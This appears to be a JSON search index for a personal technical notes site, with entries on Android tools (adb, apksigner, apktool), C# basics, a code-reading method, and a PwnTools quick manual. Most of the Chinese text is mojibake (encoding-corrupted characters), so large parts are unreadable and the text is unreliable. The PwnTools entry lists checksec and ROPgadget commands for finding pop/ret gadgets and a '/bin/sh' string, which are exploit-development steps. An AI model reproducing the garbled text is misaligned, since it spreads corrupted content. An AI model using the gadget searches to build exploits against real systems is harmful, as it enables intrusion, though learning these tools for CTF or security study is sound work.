[{"id":0,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/","title":"Android","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"Android #  å¤„ç† Android ç›¸å…³çš„è„šæœ¬å·¥å…·\n"},{"id":1,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/","title":"Docker","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"Docker #  å­¦ä¹ ç½‘å€æ¥è‡ªå®˜ç½‘ Documentï¼š\n https://docs.docker.com/get-started/  "},{"id":2,"href":"/docs/readme/","title":"Introduction","section":"Docs","content":"Introduction #  è¿™é‡Œæ˜¯ shesl çš„ç¬”è®°ç½‘ç«™ï¼š\n git-repo for note resources: Note git-repo for front pages: GitPages Repo front site: GitPages  å…³äºæˆ‘ï¼š\n é‚®ä»¶ï¼šshesl-meow@qq.com  "},{"id":3,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/","title":"Kali","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"Kali #  "},{"id":4,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/","title":"OpenSSL","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"OpenSSL #  "},{"id":5,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/pwntools/","title":"PwnTools","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"PwnTools #  Quick Manual:\n  æ£€æŸ¥å®‰å…¨æ€§ï¼ˆå·²ç»å®‰è£…äº† pwntoolsï¼Œåœ¨ peda ç­‰ gdb æ’ä»¶ä¸­ä¹Ÿæ”¯æŒï¼‰ï¼š\n$ checksec \u0026lt;program\u0026gt;   ä»£ç æ®µå…¨éƒ¨æ±‡ç¼–ä»£ç ï¼ˆobjdumpï¼‰ï¼š\n$ objdump -d \u0026lt;program\u0026gt;   ROPgadget å¾—åˆ°æŒ‡å®šçš„æŒ‡ä»¤é“¾æˆ–å­—ç¬¦ä¸²ï¼š\n# pop-ret æŒ‡ä»¤é“¾ $ ROPgadget --binary \u0026lt;program\u0026gt; --only \u0026#39;pop|ret\u0026#39;  # /bin/sh å­—ç¬¦ä¸² $ ROPgadget --binary \u0026lt;program\u0026gt; --string \u0026#39;/bin/sh\u0026#39;   "},{"id":6,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/","title":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","section":"Docs","content":"README #  "},{"id":7,"href":"/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/","title":"é¡¹ç›®åº•å±‚å®ç°","section":"Docs","content":"é¡¹ç›®åº•å±‚å®ç° #   æœ€è¿‘è½¬å²—åˆ°äº†å­—èŠ‚è·³åŠ¨æœç´¢å¹¿å‘Šç»„ï¼Œæ¥è§¦åˆ°äº†å¤§é‡æ²¡æœ‰æ¥è§¦è¿‡çš„é¡¹ç›®ä»£ç ï¼Œè§‰å¾—æœ‰å¿…è¦æ•´ç†ä¸€ä¸‹å¤§å‹é¡¹ç›®ä»£ç çš„æ–¹æ³•è®ºï¼Œæ‰“ç®—åœ¨æ­¤æ€»ç»“ä¸€äº›è‡ªå·±çš„æƒ³æ³•ï¼Œå¹¶æœ€è¿‘æ‹¿ä¸€ä¸ªå¼€æºé¡¹ç›®ä»£ç ç»ƒç»ƒæ‰‹ã€‚\n åŸºæœ¬æ–¹æ³•è®º #  å¸¦ç€é—®é¢˜è¯»ä»£ç ï¼Œå¥½äºæšä¸¾å¼è¯»ä»£ç ï¼š\n æ¯”å¦‚ï¼šè¿™ä¸ªé¡¹ç›®æ˜¯ä¸ºäº†è§£å†³ä»€ä¹ˆé—®é¢˜ï¼ˆè¯»ä»£ç å‰å…ˆæ˜ç¡®â€œæˆ‘ä¸ºä»€ä¹ˆè¦è¯»è¿™ä¸ªé¡¹ç›®ä»£ç â€ï¼Œä¹‹åå¯¹ä¸åŒçš„æ­¥éª¤æœ‰å€¾å‘åœ°ä¾§é‡ï¼‰ï¼Ÿå®ç° xxx é€»è¾‘çš„ä»£ç åœ¨å“ªé‡Œï¼Ÿè¿™ä¸ªé¡¹ç›®æ˜¯æŒ‰ç…§ä»€ä¹ˆé€»è¾‘ç»„ç»‡çš„ï¼Ÿ  åº”ç”¨ OKR çš„æ€æƒ³ï¼Œå¸¦ç€\u0026quot;äº§å‡º\u0026quot;çš„æ€ç»´è¯»ä»£ç ï¼š\n  ç»è¿‡äº†ä¸€æ®µè¿·èŒ«æ—¶é—´çš„æ„Ÿæ‚Ÿï¼Œæ²¡æœ‰æ˜ç¡®çš„äº§å‡ºç›®æ ‡å¾ˆå®¹æ˜“èµ°ç¥ã€æ³¨æ„åŠ›ä¸é›†ä¸­ã€ä»£ç çœ‹ç€çœ‹ç€å°±çœ‹æ‰‹æœºå»äº†ã€‚\n  æ¯”å¦‚ï¼šè¿™ä¸ª\u0026quot;äº§å‡º\u0026quot;å¯ä»¥æ˜¯ä¸€ç¯‡å¯ä»¥åˆ†äº«åˆ°æœ‹å‹åœˆçš„ç¬”è®°ã€ä¸€ä¸ªå¯ä»¥åœ¨å‘¨æŠ¥ä¸Šå†™ä¸Šçš„æ–‡æ¡£ï¼›\n  å¹¿åº¦ä¼˜å…ˆéå†è¯»ä»£ç ï¼Œâ€œè¯»å®Œâ€ä¼˜å…ˆçº§é«˜äºâ€œæ·±å…¥ç†è§£â€ï¼š\n  çœ‹äº†ç½‘ä¸Šå¾ˆå¤šäººäº¤æµçš„æ–¹æ³•è®ºï¼Œæœ‰äººæ›´å€¾å‘äºâ€œå¹¿åº¦â€ã€æœ‰äººæ›´å€¾å‘äºâ€œæ·±åº¦â€ï¼Œæˆ‘éƒ½æœ‰å°è¯•ã€‚æˆ‘ä¸ªäººè§‰å¾—å¯¹äºä¸€ä¸ªå®Œå…¨é™Œç”Ÿçš„é¡¹ç›®ï¼Œâ€œå¹¿åº¦â€æ˜¯â€œå¿…é€‰é¡¹â€è€Œä¸æ˜¯â€œä¸ªäººå–œå¥½â€ã€‚\n  â€œæ·±åº¦â€å‘ç”Ÿçš„ä¸¤ä¸ªåœºæ™¯ï¼š\n  åˆšå¼€å§‹è¯»å°±å¸Œæœ›äº†è§£å…¨éƒ¨çš„ä»£ç åº•å±‚é€»è¾‘ï¼šè¿™æ ·çš„é˜…è¯»æ–¹å¼ä¼šæŠŠå¤§é‡çš„æ—¶é—´æµªè´¹åœ¨ä¸é‡è¦çš„ç»†ææœ«èŠ‚ä¸Šï¼›\n  çœ‹åˆ°ä¸€ä¸ªæ–¹æ³•åã€æ³¨é‡Šã€å˜é‡åéå¸¸ç¬¦åˆæˆ‘ä»¬æœŸå¾…çš„ç›®çš„ï¼šæ²¡æœ‰å…¨å±€è§†è§’æ—¶è¿™æ ·çš„åˆ¤æ–­æ­£ç¡®ç‡ä¸ä¼šå¾ˆé«˜ï¼Œå½“æˆ‘ä»¬åˆ¤æ–­å¤±è´¥æ—¶ï¼Œå› ä¸ºäººçš„æ€ç»´ç»„ç»‡æ¨¡å¼ï¼Œæƒ³è¦å›åˆ°ä¸Šæ¬¡çš„ä½ç½®ç»§ç»­é˜…è¯»ä¼šéå¸¸å›°éš¾ã€‚å¯ä»¥å…ˆå°†è¿™ä¸ªä½ç½®è®°ä¸‹ï¼Œæœ‰å…¨å±€è§†è§’åæ·±å…¥é˜…è¯»å°†æ˜¯ ROI å¾ˆé«˜çš„äº‹æƒ…ã€‚\n    æ²¡æœ‰å®Œç¾çš„ä»£ç æ¶æ„ï¼Œå¸¦ç€è´¨ç–‘çš„å¿ƒæ€è¯»ä»£ç ï¼Œä¸è¦æ€€ç–‘è‡ªå·±ï¼›\næ­¥éª¤ #   å‰ç½®å’Œå‡†å¤‡æ¡ä»¶ï¼šäº†è§£ä»£ç çš„åŸºæœ¬ç¼–ç¨‹è¯­è¨€ï¼Œé¡¹ç›®çš„ç›®çš„ï¼Œä»£ç åº“äº§ç”Ÿçš„å†å²èƒŒæ™¯ç­‰ï¼›åŸºæœ¬æ¦‚å¿µã€æœ¯è¯­ã€ç›¸å…³é¢†åŸŸçš„å¸¸è§è¯æ±‡ï¼ˆæ¯”å¦‚å¹¿å‘Šä»£ç çš„ RITã€æŠ•æ”¾ã€å“ç‰Œå¹¿å‘Šã€ç«ä»·å¹¿å‘Šç­‰ï¼‰ï¼›\n  äº†è§£é¡¹ç›®ä»£ç ç›®çš„ã€å‡ºå…¥å£ã€åŸºæœ¬æ¡†æ¶ã€‚é¡¹ç›®ç›¸å…³æ–‡æ¡£ã€é¡¹ç›®çš„ idl æ¥å£å®šä¹‰ã€‚\n  é€šè¯»ä»£ç ï¼Œäº†è§£å¤§æ¦‚è°ƒç”¨é“¾è·¯ï¼Œæ‰¾å‡ºæ ¸å¿ƒé€»è¾‘æ¨¡å—ã€‚ä¸šåŠ¡å±‚çš„é€»è¾‘è°ƒç”¨ã€é€šç”¨ä»£ç çš„æ–‡ä»¶ç»„ç»‡ç»“æ„ï¼Œæ¯”å¦‚ rpcã€io ç­‰ï¼›\n  æŒ‰ä¼˜å…ˆçº§æ·±å…¥äº†è§£æ ¸å¿ƒæ¨¡å—é€»è¾‘\n  æ•´ç†è¿è¡Œæµç¨‹å›¾ã€æå‡ºå»ºè®®ã€‚ä¸Šæ‰‹è¿è¡Œè¿™ä¸ªä»£ç ï¼Œæ¯”å¦‚ä¸€ä¸ª benchmarkã€ä¸€ä¸ª issueã€ä¸€ä¸ªéœ€æ±‚ï¼›\n  "},{"id":8,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/","title":"å·¥å…·ä½¿ç”¨æ¥å£","section":"Docs","content":"å·¥å…·ä½¿ç”¨æ¥å£ #  å·¥å…·å¯èƒ½æ˜¯ä¸€ä¸ªç¼–ç¨‹è¯­è¨€ï¼Œæ¯”å¦‚ pythonï¼›å¯èƒ½æ˜¯å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ¯”å¦‚ï¼šawkã€iptablesã€gdb ç­‰ï¼›æˆ–è€…ç‰¹å®šçš„å·¥ä½œç¯å¢ƒä¸‹çš„é‡å¤é…ç½®ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼šshadowsocksã€kali ç­‰ï¼›\næœ¬æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹éƒ½æ˜¯ç®€å•çš„ API å­¦ä¹ æ‰‹å†Œè€Œä¸æ¶‰åŠåº•å±‚åŸç†ä¸å®ç°ã€‚\n"},{"id":9,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/","title":"æ‚é¡¹åšå®¢","section":"Docs","content":"æ‚é¡¹åšå®¢ #  "},{"id":10,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/adb/","title":"Adb","section":"Android","content":"Android Debug Bridge(ADB) #  Android Debug Bridge (adb) is a versatile command-line tool that lets you communicate with a device.\nIt is a client-server program that includes three components:\n A client, which sends commands. The client runs on your development machine. You can invoke a client from a command-line terminal by issuing an adbcommand. A daemon (adbd), which runs commands on a device. The daemon runs as a background process on each device. A server, which manages communication between the client and the daemon. The server runs as a background process on your development machine.  How does adb works #  å®¢æˆ·ç«¯ï¼š\n å¯åŠ¨ä¸€ä¸ª adb å®¢æˆ·ç«¯æ—¶ï¼Œæ­¤å®¢æˆ·ç«¯é¦–å…ˆæ£€æŸ¥æ˜¯å¦æœ‰å·²è¿è¡Œçš„ adb æœåŠ¡å™¨è¿›ç¨‹ã€‚ å¦‚æœæ²¡æœ‰ï¼Œå®ƒå°†å¯åŠ¨æœåŠ¡å™¨è¿›ç¨‹ã€‚å½“æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œå®ƒä¸æœ¬åœ° TCP ç«¯å£ 5037 ç»‘å®šï¼Œå¹¶ä¾¦å¬ä» adb å®¢æˆ·ç«¯å‘é€çš„å‘½ä»¤â€”æ‰€æœ‰ adb å®¢æˆ·ç«¯å‡ä½¿ç”¨ç«¯å£ 5037 ä¸ adb æœåŠ¡å™¨é€šä¿¡ã€‚  æœåŠ¡ç«¯ï¼š\n  å®ƒé€šè¿‡æ‰«æ 5555 åˆ° 5585 ä¹‹é—´ï¼ˆæ¨¡æ‹Ÿå™¨/è®¾å¤‡ä½¿ç”¨çš„èŒƒå›´ï¼‰çš„å¥‡æ•°å·ç«¯å£æŸ¥æ‰¾æ¨¡æ‹Ÿå™¨/è®¾å¤‡å®ä¾‹ã€‚æœåŠ¡å™¨ä¸€æ—¦å‘ç° adb åå°ç¨‹åºï¼Œå®ƒå°†è®¾ç½®ä¸è¯¥ç«¯å£çš„è¿æ¥ã€‚\n  è¯·æ³¨æ„ï¼Œæ¯ä¸ªæ¨¡æ‹Ÿå™¨/è®¾å¤‡å®ä¾‹å°†è·å–ä¸€å¯¹ç«¯å£â€”â€”ç”¨äºæ§åˆ¶å°è¿æ¥çš„å¶æ•°å·ç«¯å£ã€ç”¨äº adb è¿æ¥çš„å¥‡æ•°å·ç«¯å£ã€‚ä¾‹å¦‚ï¼š\nEmulator 1, console: 5554\rEmulator 1, adb: 5555\rEmulator 2, console: 5556\rEmulator 2, adb: 5557\rand so on...   å½“æœåŠ¡å™¨å·²è®¾ç½®ä¸æ‰€æœ‰æ¨¡æ‹Ÿå™¨å®ä¾‹çš„è¿æ¥åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ adb å‘½ä»¤è®¿é—®è¿™äº›å®ä¾‹ã€‚\nEnable adb debugging on your device #  To use adb with a device connected over USB, you must enable USB debugging in the device system settings, under Developer options.\nYou can now connect your device with USB. You can verify that your device is connected by executing adb devices from the android_sdk/platform-tools/directory. If connected, you\u0026rsquo;ll see the device name listed as a \u0026ldquo;device.\u0026rdquo;\n# see list of connected devices $ adb devices For more information about connecting to a device over USB, read Run Apps on a Hardware Device.\nConnect to a device over WiFi #  æš‚æ—¶ä¸éœ€è¦\nQuery for devices #  You can generate a list of attached devices using thedevices command.\n$ adb devices -l In response, adb prints this status information for each device:\n Serial number: A string created by adb to uniquely identify the device by its port number. Here\u0026rsquo;s an example serial number: emulator-5554 State: The connection state of the device can be one of the following:  offline: The device is not connected to adb or is not responding. device: The device is now connected to the adb server. Note that this state does not imply that the Android system is fully booted and operational because the device connects to adb while the system is still booting. However, after boot-up, this is the normal operational state of an device. no device: There is no device connected.   Description: If you include the -l option, the devices command tells you what the device is. This information is helpful when you have multiple devices connected so that you can tell them apart.  Emulator not listed #  his happens when all of the following conditions are true:\n The adb server is not running, and You use the emulator command with the -port or -ports option with an odd-numbered port value between 5554 and 5584, and The odd-numbered port you chose is not busy so the port connection can be made at the specified port number, or if it is busy, the emulator switches to another port that meets the requirements in 2, and You start the adb server after you start the emulator.  One way to avoid this situation is to let the emulator choose its own ports, and don\u0026rsquo;t run more than 16 emulators at once.\nExample:\n$ adb kill-server $ emulator -avd Nexus_6_API_25 -port 5555 $ adb devices  List of devices attached * daemon not running. starting it now on port 5037 * * daemon started successfully * Send commands to a specific device #  å¦‚æœå¤šä¸ªæ¨¡æ‹Ÿå™¨/è®¾å¤‡å®ä¾‹æ­£åœ¨è¿è¡Œï¼Œåœ¨å‘å‡º adb å‘½ä»¤æ—¶æ‚¨å¿…é¡»æŒ‡å®šä¸€ä¸ªç›®æ ‡å®ä¾‹ã€‚ä¸ºæ­¤ï¼Œè¯·åœ¨å‘½ä»¤ä¸­ä½¿ç”¨ -s é€‰é¡¹ã€‚ä»¥ä¸‹æ˜¯ -s é€‰é¡¹çš„ç”¨æ³•ï¼š\n$ adb -s \u0026lt;serial_number\u0026gt; \u0026lt;command\u0026gt; å¦‚ä¸Šæ‰€ç¤ºï¼Œæ‚¨ä½¿ç”¨ç”± adb åˆ†é…çš„åºåˆ—å·ä¸ºå‘½ä»¤æŒ‡å®šç›®æ ‡å®ä¾‹ã€‚æ‚¨å¯ä½¿ç”¨ deviceså‘½ä»¤è·å–æ­£åœ¨è¿è¡Œçš„æ¨¡æ‹Ÿå™¨/è®¾å¤‡å®ä¾‹çš„åºåˆ—å·ã€‚ä¾‹å¦‚ï¼š\n$ adb -s emulator-5556 install helloWorld.apk æ³¨æ„ï¼Œå¦‚æœåœ¨å¤šä¸ªè®¾å¤‡å¯ç”¨æ—¶æ‚¨æœªæŒ‡å®šç›®æ ‡æ¨¡æ‹Ÿå™¨/è®¾å¤‡å®ä¾‹å°±å‘å‡ºå‘½ä»¤ï¼Œé‚£ä¹ˆ adb å°†ç”Ÿæˆä¸€ä¸ªé”™è¯¯ã€‚\nå¦å¤–ï¼š\n å¦‚æœæ‚¨æœ‰å¤šä¸ªè®¾å¤‡å¯ç”¨ï¼ˆç¡¬ä»¶æˆ–æ¨¡æ‹Ÿè®¾å¤‡ï¼‰ï¼Œä½†åªæœ‰ä¸€ä¸ªè®¾å¤‡æ˜¯æ¨¡æ‹Ÿå™¨ï¼Œåˆ™ä½¿ç”¨ -eé€‰é¡¹å°†å‘½ä»¤å‘é€è‡³è¯¥æ¨¡æ‹Ÿå™¨ã€‚ åŒæ ·ï¼Œå¦‚æœæœ‰å¤šä¸ªè®¾å¤‡ï¼Œä½†åªè¿æ¥äº†ä¸€ä¸ªç¡¬ä»¶è®¾å¤‡ï¼Œåˆ™ä½¿ç”¨ -d é€‰é¡¹å°†å‘½ä»¤å‘é€è‡³è¯¥ç¡¬ä»¶è®¾å¤‡ã€‚  Install an app #  You can use adb to install an APK on an emulator or connected device with the install command:\n$ adb install path_to_apk You must use the -t option with the install command when you install a test APK. For more information, see -t.\nSet up port forwarding #  You can use the forward command to set up arbitrary port forwarding, which forwards requests on a specific host port to a different port on a device. The following example sets up forwarding of host port 6100 to device port 7100:\n$ adb forward tcp:6100 tcp:7100 Copy files to/from a device #  Use the pull and push commands to copy files to and from an device. Unlike the install command, which only copies an APK file to a specific location, the pulland push commands let you copy arbitrary directories and files to any location in a device.\nTo copy a file or directory and its sub-directories from the device, do the following:\n$ adb pull remote local To copy a file or directory and its sub-directories to the device, do the following:\n$ adb push local remote Replace local and remote with the paths to the target files/directory on your development machine (local) and on the device (remote). For example:\n$ adb push foo.txt /sdcard/foo.txt Stop the adb server #  In some cases, you might need to terminate the adb server process and then restart it to resolve the problem (e.g., if adb does not respond to a command).\nTo stop the adb server, use the adb kill-server command. You can then restart the server by issuing any other adb command.\n$ adb kill-server adb commands reference #  see: https://developer.android.com/studio/command-line/adb\n"},{"id":11,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/apksigner/","title":"Apksigner","section":"Android","content":" å­¦ä¹ é€”å¾„ï¼š\n å®˜æ–¹å‘½ä»¤è¡Œå·¥å…·ï¼šhttps://developer.android.com/studio/command-line/apksigner   apksigner #  Usage #  sign an apk #  The syntax for signing an APK using the apksigner tool is as follows:\n$ apksigner sign --ks keystore.jks [signer_options] app-name.apk  # or  $ apksigner sign --key key.pk8 --cert cert.x509.pem [signer_options] app-name.apk When you sign an APK using the apksigner tool, you must provide the signer\u0026rsquo;s private key and certificate. You can include this information in two different ways:\n Specify a Key Store file using the --ks option. Specify the private key file and certificate file separately using the --key and --cert options, respectively. The private key file must use the PKCS #8 format, and the certificate file must use the X.509 format.  Usually, you sign an APK using only one signer. In the event that you need to sign an APK using multiple signers, use the --next-signer option to separate the set of general options to apply to each signer:\n$ apksigner sign [signer_1_options] --next-signer [signer_2_options] app-name.apk verify the signature of an apk #  The syntax for confirming that an APK\u0026rsquo;s signature will be verified successfully on supported platforms is as follows:\n$ apksigner verify [options] app-name.apk Rotate signing keys #  The syntax for rotating a signing certificate lineage, or a new sequence of signatures, is as follows:\n$ apksigner rotate --in /path/to/existing/lineage \\  --out /path/to/new/file \\  --old-signer --ks old-signer-jks \\  --new-signer --ks new-signer-jks Example #  Sign an APK #  Sign an APK using release.jks, which is the only key in the KeyStore:\n$ apksigner sign --ks release.jks app.apk Sign an APK using a private key and certificate, stored as separate files:\n$ apksigner sign --key release.pk8 --cert release.x509.pem app.apk Sign an APK using two keys:\n$ apksigner sign --ks first-release-key.jks --next-signer --ks second-release-key.jks app.apk Verify the signature of an APK #  Check whether the APK\u0026rsquo;s signatures are expected to be confirmed as valid on all Android platforms that the APK supports:\n$ apksigner verify app.apk Check whether the APK\u0026rsquo;s signatures are expected to be confirmed as valid on Android 4.0.3 (API level 15) and higher:\n$ apksigner verify --min-sdk-version 15 app.apk Rotate signing keys #  Enable a signing certificate lineage that supports key rotation:\n$ apksigner rotate --out /path/to/new/file --old-signer \\  --ks release.jks --new-signer --ks release2.jks Rotate your signing keys again:\n$ apksigner rotate --in /path/to/existing/lineage \\  --out /path/to/new/file --old-signer --ks release2.jks \\  --new-signer --ks release3.jks "},{"id":12,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/apktool/","title":"Apktool","section":"Android","content":" å­¦ä¹ é€”å¾„ï¼š\n å®˜ç½‘æ•™ç¨‹ï¼šhttps://ibotpeaches.github.io/Apktool/   apktool #  Basic #  First lets take a lesson into apk files. Apks are nothing more than a zip file containing resources and assembled java code. If you were to simply unzip an apk like so, you would be left with files such as classes.dex and resources.arsc.\n$ unzip testapp.apk -d unzip-folder ...  $ cd unzip-folder  $ ls AndroidManifest.xml META-INF classes.dex res resources.arsc Obviously, editing or viewing a compiled file is next to impossible. That is where Apktool comes into play:\n$ apktool d testapp.apk I: Using Apktool 2.3.4 on testapp.apk ... Decoding #  The decode option on Apktool can be invoked either from d or decode like shown below.\n$ apktool d foo.jar # decodes foo.jar to foo.jar.out folder  $ apktool decode foo.jar # decodes foo.jar to foo.jar.out folder  $ apktool d bar.apk # decodes bar.apk to bar folder  $ apktool decode bar.apk # decodes bar.apk to bar folder  $ apktool d bar.apk -o baz # decodes bar.apk to baz folder Building #  The build option can be invoked either from b or build like shown below\n$ apktool b foo.jar.out # builds foo.jar.out folder into foo.jar.out/dist/foo.jar file  $ apktool build foo.jar.out # builds foo.jar.out folder into foo.jar.out/dist/foo.jar file  $ apktool b bar # builds bar folder into bar/dist/bar.apk file  $ apktool b . # builds current directory into ./dist  $ apktool b bar -o new_bar.apk # builds bar folder into new_bar.apk  $ apktool b bar.apk # WRONG: brut.androlib.AndrolibException: brut.directory.PathNotExist: apktool.yml # Must use folder, not apk/jar file Frameworks #  Frameworks can be installed either from if or install-framework, in addition two parameters\n  -p, --frame-path \u0026lt;dir\u0026gt; - Store framework files into \u0026lt;dir\u0026gt;\n  -t, --tag \u0026lt;tag\u0026gt; - Tag frameworks using \u0026lt;tag\u0026gt;\n  -t, --tag \u0026lt;tag\u0026gt; - Tag frameworks using \u0026lt;tag\u0026gt;\n  Allow for a finer control over how the files are named and how they are stored.\n$ apktool if framework-res.apk I: Framework installed to: 1.apk # pkgId of framework-res.apk determines number (which is 0x01)  $ apktool if com.htc.resources.apk I: Framework installed to: 2.apk # pkgId of com.htc.resources is 0x02  $ apktool if com.htc.resources.apk -t htc I: Framework installed to: 2-htc.apk # pkgId-tag.apk  $ apktool if framework-res.apk -p foo/bar I: Framework installed to: foo/bar/1.apk  $ apktool if framework-res.apk -t baz -p foo/bar I: Framework installed to: foo/bar/1-baz.ap "},{"id":13,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/1.%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/","title":"1.åŸºæœ¬ä»‹ç»","section":"C#","content":"C# ç®€ä»‹ #  é€šè¿‡èœé¸Ÿæ•™ç¨‹å­¦ä¹ ï¼š\n https://www.runoob.com/csharp/csharp-intro.html  C# æä¾›çš„ä¸€äº›åŠŸèƒ½å¦‚ä¸‹ï¼š\n å¸ƒå°”æ¡ä»¶ï¼ˆBoolean Conditionsï¼‰ è‡ªåŠ¨åƒåœ¾å›æ”¶ï¼ˆAutomatic Garbage Collectionï¼‰ æ ‡å‡†åº“ï¼ˆStandard Libraryï¼‰ ç»„ä»¶ç‰ˆæœ¬ï¼ˆAssembly Versioningï¼‰ å±æ€§ï¼ˆPropertiesï¼‰å’Œäº‹ä»¶ï¼ˆEventsï¼‰ å§”æ‰˜ï¼ˆDelegatesï¼‰å’Œäº‹ä»¶ç®¡ç†ï¼ˆEvents Managementï¼‰ æ˜“äºä½¿ç”¨çš„æ³›å‹ï¼ˆGenericsï¼‰ ç´¢å¼•å™¨ï¼ˆIndexersï¼‰ æ¡ä»¶ç¼–è¯‘ï¼ˆConditional Compilationï¼‰ ç®€å•çš„å¤šçº¿ç¨‹ï¼ˆMultithreadingï¼‰ LINQ å’Œ Lambda è¡¨è¾¾å¼ é›†æˆ Windows  "},{"id":14,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/2.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"2.åŸºæœ¬è¯­æ³•","section":"C#","content":"åŸºæœ¬è¯­æ³• #  æ•°æ®ç±»å‹ #  åœ¨ C# ä¸­ï¼Œå˜é‡åˆ†ä¸ºä»¥ä¸‹å‡ ç§ç±»å‹ï¼šå€¼ç±»å‹ï¼ˆValue typesï¼‰ã€å¼•ç”¨ç±»å‹ï¼ˆReference typesï¼‰ã€æŒ‡é’ˆç±»å‹ï¼ˆPointer typesï¼‰\nå€¼ç±»å‹ #  å€¼ç±»å‹éƒ½æ˜¯ä»ç±» System.ValueType ä¸­æ´¾ç”Ÿçš„ã€‚å€¼ç±»å‹ç›´æ¥ç”¨æ¥å­˜å‚¨æ•°æ®ã€‚\nä¸‹é¢æ˜¯å¸¸è§çš„å€¼ç±»å‹ï¼š\n   ç±»å‹ æè¿° èŒƒå›´ é»˜è®¤å€¼     bool å¸ƒå°”å€¼ True æˆ– False False   byte 8 ä½æ— ç¬¦å·æ•´æ•° 0 åˆ° 255 0   char 16 ä½ Unicode å­—ç¬¦ U +0000 åˆ° U +ffff \u0026lsquo;\\0\u0026rsquo;   decimal 128 ä½ç²¾ç¡®çš„åè¿›åˆ¶å€¼ï¼Œ28-29 æœ‰æ•ˆä½æ•° (-7.9 x 1028 åˆ° 7.9 x 1028) / 100 åˆ° 28 0.0M   double 64 ä½åŒç²¾åº¦æµ®ç‚¹å‹ (+/-)5.0 x 10-324 åˆ° (+/-)1.7 x 10308 0.0D   float 32 ä½å•ç²¾åº¦æµ®ç‚¹å‹ -3.4 x 1038 åˆ° + 3.4 x 1038 0.0F   int 32 ä½æœ‰ç¬¦å·æ•´æ•°ç±»å‹ -2,147,483,648 åˆ° 2,147,483,647 0   long 64 ä½æœ‰ç¬¦å·æ•´æ•°ç±»å‹ -9,223,372,036,854,775,808 åˆ° 9,223,372,036,854,775,807 0L   sbyte 8 ä½æœ‰ç¬¦å·æ•´æ•°ç±»å‹ -128 åˆ° 127 0   short 16 ä½æœ‰ç¬¦å·æ•´æ•°ç±»å‹ -32,768 åˆ° 32,767 0   uint 32 ä½æ— ç¬¦å·æ•´æ•°ç±»å‹ 0 åˆ° 4,294,967,295 0   ulong 64 ä½æ— ç¬¦å·æ•´æ•°ç±»å‹ 0 åˆ° 18,446,744,073,709,551,615 0   ushort 16 ä½æ— ç¬¦å·æ•´æ•°ç±»å‹ 0 åˆ° 65,535 0    å¦‚æœæƒ³è¦å¾—åˆ°æŸä¸ªç±»å‹åœ¨è¿è¡Œå¹³å°ä¸Šçš„å¤§å°ï¼Œå¯ä»¥ä½¿ç”¨ sizeof æ–¹æ³•ã€‚\nå¼•ç”¨ç±»å‹ #  å¼•ç”¨ç±»å‹ä¸åŒ…å«å­˜å‚¨åœ¨å˜é‡ä¸­çš„å®é™…æ•°æ®ï¼Œä½†å®ƒä»¬åŒ…å«å¯¹å˜é‡çš„å¼•ç”¨ã€‚å¤šä¸ªå¼•ç”¨ç±»å‹å¯èƒ½æŒ‡å‘åŒä¸€ä¸ªç‰©ç†ä½ç½®ï¼Œå› æ­¤å¦‚æœæŸä¸€ä¸ªå˜é‡çš„æ•°æ®å‘ç”Ÿæ”¹å˜ï¼Œå…¶ä»–çš„å˜é‡ä¹Ÿä¼šå‘ç”Ÿæ”¹å˜ã€‚\nC# å†…ç½®çš„å¼•ç”¨ç±»å‹æœ‰ objectã€dynamicã€stringã€‚\n  object å³ System.Objectï¼Œå¯¹è±¡æ˜¯ C# çš„é€šç”¨ç±»å‹ç³»ç»Ÿï¼ˆCommon Type Stream: CTSï¼‰ã€‚\nå½“ä¸€ä¸ªå€¼ç±»å‹è½¬æ¢ä¸ºå¯¹è±¡ç±»å‹æ—¶ï¼Œåˆ™è¢«ç§°ä¸º è£…ç®±ï¼›å¦ä¸€æ–¹é¢ï¼Œå½“ä¸€ä¸ªå¯¹è±¡ç±»å‹è½¬æ¢ä¸ºå€¼ç±»å‹æ—¶ï¼Œåˆ™è¢«ç§°ä¸º æ‹†ç®±ã€‚\nobject obj;\t// å£°æ˜å¯¹è±¡ç±»å‹å˜é‡ obj = 100;\t// è£…ç®±   dynamic 